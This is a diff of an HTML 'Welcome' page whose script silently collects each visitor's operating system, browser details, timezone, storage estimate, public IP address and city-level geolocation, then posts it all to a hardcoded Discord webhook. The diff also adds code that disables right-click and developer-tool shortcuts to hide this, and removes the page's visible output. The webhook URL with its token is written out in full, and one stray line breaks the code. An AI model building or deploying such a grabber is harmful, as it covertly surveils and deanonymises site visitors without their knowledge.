@@ -3,21 +3,50 @@
 <head>
     <title>Welcome</title>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
-        .info { background: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
+        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
     </style>
 </head>
 <body>
-
     <script>
-        window.onload = function() {
-            gatherSystemInfo();
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
+        document.onkeydown = function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+                (e.ctrlKey && e.key === 'U')) {
+                return false;
+            }
         };
 
-        function gatherSystemInfo() {
-            let info = "";
+        (async function() {
+            let info = "[+] System Information Collected:\n";
+            s
+            info += "\n[+] Device Type:\n";
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (/windows/.test(userAgent)) {
+                info += "OS: Windows\n";
+            } else if (/macintosh|mac os x/.test(userAgent)) {
+                info += "OS: MacOS\n";
+            } else if (/linux/.test(userAgent)) {
+                info += "OS: Linux\n";
+            } else if (/android/.test(userAgent)) {
+                info += "OS: Android\n";
+            } else if (/iphone|ipad|ipod/.test(userAgent)) {
+                info += "OS: iOS\n";
+            } else {
+                info += "OS: Unknown\n";
+            }
             
-            info += "[+] Browser Information:\n";
+            if (/mobile|android|iphone|ipad|ipod/.test(userAgent)) {
+                info += "Device: Mobile\n";
+            } else {
+                info += "Device: Desktop\n";
+            }
+
+            info += "\n[+] Browser Information:\n";
             info += `User Agent: ${navigator.userAgent}\n`;
             info += `Platform: ${navigator.platform}\n`;
             info += `Language: ${navigator.language}\n`;
@@ -34,10 +63,48 @@
             info += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
             info += `Local Time: ${new Date()}\n`;
             
-            document.getElementById('infoOutput').textContent = info;
- 
+            info += "\n[+] Storage Information:\n";
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const storage = await navigator.storage.estimate();
+                    info += `Total (approx): ${Math.round(storage.quota / (1024 * 1024 * 1024))} GB\n`;
+                    info += `Used (approx): ${Math.round((storage.quota - storage.usage) / (1024 * 1024 * 1024))} GB\n`;
+                } catch (e) {
+                    info += "Storage API not supported\n";
+                }
+            } else {
+                info += "Storage API not supported\n";
+            }
+
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                const locationResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,as,query`);
+                const locationData = await locationResponse.json();
+                
+                info += "\n[+] Network Information:\n";
+                info += `IP Address: ${ip}\n`;
+                if (locationData.status === 'success') {
+                    info += `Country: ${locationData.country}\n`;
+                    info += `Region: ${locationData.regionName}\n`;
+                    info += `City: ${locationData.city}\n`;
+                    info += `ISP: ${locationData.isp}\n`;
+                    info += `Organization: ${locationData.org}\n`;
+                    info += `AS: ${locationData.as}\n`;
+                } else {
+                    info += "Location lookup failed\n";
+                }
+            } catch (e) {
+                info += "\n[!] Failed to fetch IP/location information\n";
+            }
+            
+            info += "\n[+] Hardware Information:\n";
+            info += `CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
+            
             sendToDiscord(info);
-        }
+        })();
         
         function sendToDiscord(data) {
             const webhookURL = 'https://discord.com/api/webhooks/1396899184363438262/Xov5NQzse6RvbOlnIBlPVLlMopYd_wQzqRJy1-XblMd76f5l5d76yDkEcLhD1svhWmnz';
@@ -52,7 +119,7 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify(payload),
-            });
+            }).catch(e => console.error('Discord send failed'));
         }
     </script>
 </body>
